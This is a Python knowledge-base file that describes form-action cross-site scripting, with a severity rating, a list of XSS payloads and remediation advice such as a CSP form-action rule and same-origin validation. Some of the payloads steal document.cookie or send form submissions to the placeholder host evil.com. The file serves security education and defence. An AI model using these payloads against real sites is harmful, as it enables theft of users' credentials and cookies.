#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: Form Action Context XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via Form Action",
    "severity": "high",
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79", "CWE-601"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "form", "action", "formaction", "submit", "csrf"],
    "description": """
Form action XSS occurs when user input controls form action or formaction attributes.
Can redirect form submissions to attacker-controlled endpoints or execute JavaScript.

SEVERITY: HIGH
Leads to credential theft, CSRF amplification, and data exfiltration.
Often combined with clickjacking attacks.
""",
    "attack_vector": """
FORM ACTION JAVASCRIPT:
<form action="javascript:alert(1)"><input type=submit>

FORMACTION ATTRIBUTE:
<form><button formaction="javascript:alert(1)">Submit</button></form>

INPUT FORMACTION:
<form><input type=submit formaction="javascript:alert(1)">

DATA URI ACTION:
<form action="data:text/html,<script>alert(1)</script>">

REDIRECT TO ATTACKER:
<form action="https://evil.com/steal.php">

ONSUBMIT HANDLER:
<form onsubmit="alert(1)">

FORMMETHOD BYPASS:
<button formaction="//evil.com" formmethod="get">

BUTTON FORMACTION:
<button formaction="javascript:alert(document.cookie)">

ISINDEX LEGACY:
<isindex action="javascript:alert(1)">

SVG FORM:
<svg><foreignObject><form action="javascript:alert(1)"></form></foreignObject></svg>

ENCTYPE MANIPULATION:
<form enctype="text/plain" action="https://evil.com">

BASE HIJACK + FORM:
<base href="https://evil.com"><form action="/login">
""",
    "remediation": """
DEFENSE:

1. WHITELIST allowed action URLs
2. Block javascript: protocol in action
3. Use same-origin action only
4. Implement CSRF tokens
5. Set CSP form-action directive
6. Validate action server-side

CSP FORM-ACTION:
Content-Security-Policy: form-action 'self';

VALIDATION (JavaScript):
function isValidAction(action) {
  const url = new URL(action, location.origin);
  return url.origin === location.origin;
}

VALIDATION (Python/Django):
from django.urls import resolve
def is_internal_url(url):
    try:
        resolve(url)
        return True
    except:
        return False

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- CWE-601: Open Redirect
- CSRF Prevention Cheat Sheet
""",
}
